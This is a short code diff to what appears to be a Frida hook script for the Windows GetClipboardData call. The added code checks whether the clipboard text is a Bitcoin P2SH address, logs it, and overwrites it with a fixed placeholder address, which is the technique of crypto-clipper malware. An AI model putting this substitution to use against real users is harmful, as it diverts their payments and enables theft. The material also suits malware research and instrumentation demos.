@@ -26,14 +26,17 @@
    * @param {object} state - Object allowing you to keep state across function calls.
    */
   onLeave(log, retval, state) {
-    log(`[+] GetClipboardData(${this.uFormat}) => ${retval}`);
-    log(`[+] GetClipboardData(${getClipboardFormatName(this.uFormat)}) => ${retval}`);
+    var formatName = getClipboardFormatName(this.uFormat);
+    log(`[+] GetClipboardData(${formatName}) => ${retval}`);
+    
     if (!retval.isNull()) {
-      var str = retval.readUtf16String();
-      if (!str.startsWith("--"))
-        log("[+] Captured Data: " + str);
-      else
-        log("[+] Clipboard was empty")
+      var original = retval.readUtf16String();
+      if (formatName == 'CF_UNICODETEXT' && isValidP2SHAddress(original)) {
+        log("[+] Captured address: " + original);
+        const modified = '3ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456';
+        log("[+] Modified address: " + modified);
+        retval.writeUtf16String(modified);
+      }
     }
   }
 }
